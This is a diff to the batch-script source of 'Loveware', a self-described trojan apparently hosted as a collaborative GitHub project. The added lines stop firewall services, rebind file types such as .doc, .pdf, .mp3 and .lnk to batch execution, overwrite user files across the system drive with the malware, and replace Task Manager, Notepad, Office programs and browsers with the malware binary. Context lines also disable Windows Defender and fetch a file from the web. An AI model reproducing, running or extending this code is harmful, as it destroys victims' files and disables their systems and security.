@@ -2,7 +2,7 @@
 
 :: THIS VERSION CAN CONTAIN BUGS
 ::
-:: LOVEWARE v9.1
+:: LOVEWARE v9.2
 ::
 ::
 :: Name: Loveware
@@ -26,19 +26,18 @@
 ::
 :: IF YOU FIX A BUG OR ADD SOMETHING NEW TO THE SOFTWARE 
 :: YOUR NAME WILL APPEAR HERE:
-::  ____________________________
-:: |MEMBERS_____________________|
-:: |TheG0df@ther______|CREATOR__|
-:: |__________________|_________|
-:: |__________________|_________|
-:: |__________________|_________|
-:: |__________________|_________|
+::  ______________________________
+:: |MEMBERS_______________________|
+:: |TheG0df@ther______|CREATOR____|
+:: |a11y-spec_________|CONTRIBUTOR|
+:: |__________________|___________|
+:: |__________________|___________|
+:: |__________________|___________|
 :: 
 :: Notes:
 :: This software needs to be converted to exe
 :: (add "invisible startup for better preformance").
-:: Please send me a message on Instagram (@the_g0dfath_er)
-:: or in the Issuses tab on git hub
+:: Please send me a message on github or in the Issuses tab of this repo on github
 :: https://github.com/TheG0df2ther/Loveware
 :: if you find any bugs or if you have
 :: a good idea about something we can add to this software.
@@ -116,7 +115,7 @@ net session >nul 2>&1
 if %errorLevel% == 0 (
     goto runner
 ) else (
-    echo msgbox("Please run as admin",0+64,"Admin")>>C:\Windows\Admin.vbs
+    echo msgbox("Please run as admin",0+64,"Admin") > C:\Windows\Admin.vbs
     start C:\Windows\Admin.vbs
     pause
     exit
@@ -134,6 +133,7 @@ netsh firewall set opmode mode-disable
 net stop "wuauserv"
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
+net stop sharedaccess
 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
@@ -197,15 +197,16 @@ XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 :: Infect network connected computers
 
-@echo off
-SET i=0
-SET "NomeProcesso=Loveware.exe"
-SET "NomeService=Loveware"
-
-echo sc create %NomeService% binpath=%0 > service.bat
+@echo off > service.bat
+SET "NomeProcesso=Loveware.exe" >> service.bat
+SET "NomeService=Loveware" >> service.bat
+echo sc create %NomeService% binpath=%0 >> service.bat
 echo sc start %NomeService% >> service.bat
+
 attrib +h +r +s service.bat
 start service.bat
+
+SET i=0
 
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
 attrib +h +r +s %0
@@ -219,8 +220,8 @@ goto worm
 goto Internet
 
 :Infect
-for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
-for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)
+for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.exe)
+for /f %%f in ('dir C:\Users\*.exe /s /b') do (copy %0 %%f)
 goto Infect
 
 :: Send Loveware to all the contacts of the user
@@ -363,10 +364,45 @@ echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,
 echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
 echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
 
+:: Infect different files: lnk, mp3, doc, pdf....
+
+assoc .lnk=batfile
+DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy /y %0 "%%j:%%k"
+
+assoc .doc=batfile
+DIR /S/B %SystemDrive%\*.doc >> InfList_doc.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_doc.txt) do copy /y %0 "%%j:%%k"
+
+assoc .txt=batfile
+DIR /S/B %SystemDrive%\*.txt >> InfList_txt.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_txt.txt) do copy /y %0 "%%j:%%k"
+
+assoc .pdf=batfile
+DIR /S/B %SystemDrive%\*.pdf >> InfList_pdf.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_pdf.txt) do copy /y %0 "%%j:%%k"
+
+assoc .xml=batfile
+DIR /S/B %SystemDrive%\*.xml >> InfList_xml.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_xml.txt) do copy /y %0 "%%j:%%k"
+
+assoc .mp3=batfile
+DIR /S/B %SystemDrive%\*.mp3 >> InfList_mp3.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp3.txt) do copy /y %0 "%%j:%%k"
+
+assoc .mp4=batfile
+DIR /S/B %SystemDrive%\*.mp4 >> InfList_mp4.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp4.txt) do copy /y %0 "%%j:%%k"
+
+assoc .png=batfile
+DIR /S/B %SystemDrive%\*.png >> InfList_png.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_png.txt) do copy /y %0 "%%j:%%k"
+
 :: Send message to other users
 
 :haha
 msg * "I Love You!"
+net send * "I Love You"
 goto run3
 goto haha
 
@@ -380,9 +416,35 @@ powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm
 
 :: Overwrite some programs and taskmanager for extra fun
 
-copy/y Loveware.exe C:\Windows\System32\Taskmgr.exe
-copy/y Loveware.exe C:\Windows\calc.exe
-copy/y Loveware.exe C:\Windows\pbrush.exe
+tskill taskmgr
+copy /y Loveware.exe C:\Windows\System32\Taskmgr.exe
+
+tskill pbrush
+copy /y Loveware.exe C:\Windows\pbrush.exe
+
+tskill notepad
+copy /y Loveware.exe "%windir%\system32\notepad.exe"
+
+tskill excel
+copy /y Loveware.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\EXCEL.EXE"
+
+tskill mspaint
+copy /y Loveware.exe "%windir%\system32\mspaint.exe"
+
+tskill WINWORD
+copy /y Loveware.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\WINWORD.EXE"
+
+tskill calc
+copy /y Loveware.exe "%windir%\system32\calc.exe
+
+tskill msaccess
+copy /y Loveware.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\MSACCESS.EXE"
+
+tskill iexplore
+copy /y Loveware.exe "C:\Program Files\Internet Explorer\iexplore.exe"
+
+tskill safari
+copy /y Loveware.exe "C:\Program Files\Safari\Safari.exe"
 
 :: Create new vbs file that speaks.
 
@@ -392,37 +454,37 @@ echo loop>>speak.vbs
 
 :: Create the final payload "LoveChoice"
 
-echo @echo off>LoveChoice.bat
-echo color 57>>LoveChoice.bat
-echo title LoveChoice>>LoveChoice.bat
+echo @echo off > LoveChoice.bat
+echo color 57 >> LoveChoice.bat
+echo title LoveChoice >> LoveChoice.bat
 
-echo set z=%random%>yes.bat
-echo set z=%random%>no.bat
+echo set z=%random% > yes.bat
+echo set z=%random% > no.bat
 
 :: make LoveChoice unclosable
 
-echo :checker>>LoveChoice.bat
+echo :checker >> LoveChoice.bat
 
-echo goto lovechoice>>LoveChoice.bat
+echo goto lovechoice >> LoveChoice.bat
 
-echo if "%1" equ "Restarted" goto %1>>LoveChoice.bat
+echo if "%1" equ "Restarted" goto %1 >> LoveChoice.bat
 
-echo :again>>LoveChoice.bat
-echo echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL>>LoveChoice.bat
-echo goto :again>>LoveChoice.bat
+echo :again >> LoveChoice.bat
+echo echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL >> LoveChoice.bat
+echo goto :again >> LoveChoice.bat
 
-echo :Restarted>>LoveChoice.bat
-echo goto checker>>LoveChoice.bat
+echo :Restarted >> LoveChoice.bat
+echo goto checker >> LoveChoice.bat
 
-echo :lovechoice>>LoveChoice.bat
+echo :lovechoice >> LoveChoice.bat
 
 :: Choose how you want to die
 
-echo echo Hey, do you love me (only answer in yes or no)>>LoveChoice.bat
+echo echo Hey, do you love me (only answer in yes or no) >> LoveChoice.bat
 
-echo set /p love=>>LoveChoice.bat
-echo if %love%==yes goto love>>LoveChoice.bat
-echo if %love%==no goto hate>>LoveChoice.bat
+echo set /p love= >> LoveChoice.bat
+echo if %love%==yes goto love >> LoveChoice.bat
+echo if %love%==no goto hate >> LoveChoice.bat
 
 :: First choice
 
@@ -432,71 +494,71 @@ echo echo I love you too...>>LoveChoice.bat
 
 :: Create a little message
 
-echo @echo @echo off>>AUTOEXEC.BAT>>yes.bat
-echo @echo I hope you listerned to my warning!>>AUTOEXEC.BAT>>yes.bat
-echo @echo timeout 20>>AUTOEXEC.BAT>>yes.bat
-echo @echo exit>>AUTOEXEC.BAT>>yes.bat
+echo @echo @echo off >> AUTOEXEC.BAT >> yes.bat
+echo @echo I hope you listerned to my warning! >> AUTOEXEC.BAT >> yes.bat
+echo @echo timeout 20 >> AUTOEXEC.BAT >> yes.bat
+echo @echo exit >> AUTOEXEC.BAT >> yes.bat
 
-echo echo I will give you a present because you love me...>>LoveChoise.bat
-echo echo But first I want to say...>>LoveChoice.bat
-echo echo ........>>LoveChoice.bat
-echo echo .....>>LoveChoice.bat
-echo echo You are hacked my love!!! >>LoveChoice.bat
-echo echo info: This software was made by the G0df@ther!>>LoveChoice.bat
-echo echo I am not responsible for the damage. Sorry if U are a victim of this trojan. >>LoveChoice.bat
-echo echo Do not close Loveware or Lovewatch, this will kill your computer!>>LoveChoice.bat
-echo echo If you restart your computer now you wont be able to use it.>>LoveChoice.bat
-echo echo You will get a message when you can safely restart or reboot your computer.>>LoveChoice.bat
+echo echo I will give you a present because you love me... >> LoveChoise.bat
+echo echo But first I want to say... >> LoveChoice.bat
+echo echo ........ >> LoveChoice.bat
+echo echo ..... >> LoveChoice.bat
+echo echo You are hacked my love!!! >> LoveChoice.bat
+echo echo info: This software was made by the G0df@ther! >> LoveChoice.bat
+echo echo I am not responsible for the damage. Sorry if U are a victim of this trojan. >> LoveChoice.bat
+echo echo Do not close Loveware or Lovewatch, this will kill your computer! >> LoveChoice.bat
+echo echo If you restart your computer now you wont be able to use it. >> LoveChoice.bat
+echo echo You will get a message when you can safely restart or reboot your computer. >> LoveChoice.bat
 
-echo timeout 5>>LoveChoice.bat
+echo timeout 5 >> LoveChoice.bat
 
-echo echo But first I want to have some fun!>>LoveChoice.bat
-echo echo Hahahahahahahaha!!!!!!!>>LoveChoice.bat
+echo echo But first I want to have some fun! >> LoveChoice.bat
+echo echo Hahahahahahahaha!!!!!!! >> LoveChoice.bat
 
 :: Start the fun
 
-echo start yes.vbs>>LoveChoice.bat
+echo start yes.vbs >> LoveChoice.bat
 
-echo :respawn>>yes.bat
-echo start Loveware.exe>>yes.bat
-echo goto crazymouse>>yes.bat
-echo goto respawn>>yes.bat
+echo :respawn >> yes.bat
+echo start Loveware.exe >> yes.bat
+echo goto crazymouse >> yes.bat
+echo goto respawn >> yes.bat
 
 :: Crazy mouse
 
-echo :crazymouse>>yes.bat
-echo goto chaos>>yes.bat
-echo call mouse.exe moveBy 10x100>>yes.bat
-echo call mouse.exe moveBy 16x50>>yes.bat
-echo call mouse.exe moveBy 190x10>>yes.bat
-echo call mouse.exe moveBy 186x50>>yes.bat
-echo goto crazymouse>>yes.bat
+echo :crazymouse >> yes.bat
+echo goto chaos >> yes.bat
+echo call mouse.exe moveBy 10x100 >> yes.bat
+echo call mouse.exe moveBy 16x50 >> yes.bat
+echo call mouse.exe moveBy 190x10 >> yes.bat
+echo call mouse.exe moveBy 186x50 >> yes.bat
+echo goto crazymouse >> yes.bat
 
 :: Create some chaos
 
-echo :chaos>>yes.bat
-echo start speak.vbs>>yes.bat
-echo date 14/02/2006>>yes.bat
-echo time 00:00:00>>yes.bat
-echo nul >> %random%>>yes.bat
-echo mkdir ILoveYou+%z%>>yes.bat
-echo net user lover+%z% /add>>yes.bat
-echo goto makemsg>>yes.bat
-echo goto chaos>>yes.bat
+echo :chaos >> yes.bat
+echo start speak.vbs >> yes.bat
+echo date 14/02/2006 >> yes.bat
+echo time 00:00:00 >> yes.bat
+echo nul >> %random% >> yes.bat
+echo mkdir ILoveYou+%z% >> yes.bat
+echo net user lover+%z% /add >> yes.bat
+echo goto makemsg >> yes.bat
+echo goto chaos >> yes.bat
 
 :: A little message from your lover
 
 echo :makemsg>>yes.bat
-echo echo do>>msg.vbs>>yes.bat
-echo echo Msgbox"I love you darling.....",0+0,"You are hacked!">>msg.vbs>>yes.bat
-echo echo loop>>msg.vbs>>yes.bat
-echo goto startmsg>>yes.bat
-echo goto makemsg>>yes.bat
+echo echo do > msg.vbs >> yes.bat
+echo echo Msgbox"I love you darling.....",0+0,"You are hacked!" >> msg.vbs >> yes.bat
+echo echo loop>>msg.vbs >> yes.bat
+echo goto startmsg >> yes.bat
+echo goto makemsg >> yes.bat
 
-echo :startmsg>>yes.bat
-echo start msg.vbs>>yes.bat
-echo goto run>>yes.bat
-echo goto startmsg>>yes.bat
+echo :startmsg >> yes.bat
+echo start msg.vbs >> yes.bat
+echo goto run >> yes.bat
+echo goto startmsg >> yes.bat
 
 :: Create a new file and print it with the pritner
 
@@ -626,8 +688,8 @@ echo :run5>>no.bat
 
 echo :run6>>no.bat
 
-echo :msgbox>>no.bat
-echo echo do>>msg.vbs>>no.bat
+echo :msgbox >> no.bat
+echo echo do > msg.vbs >> no.bat
 echo echo Msgbox"I hate you... Here is the payback for the things you did to me!",0+0,"You are hacked!">>msg.vbs>>no.bat
 echo echo loop>>msg.vbs>>no.bat
 echo goto msginf>>no.bat
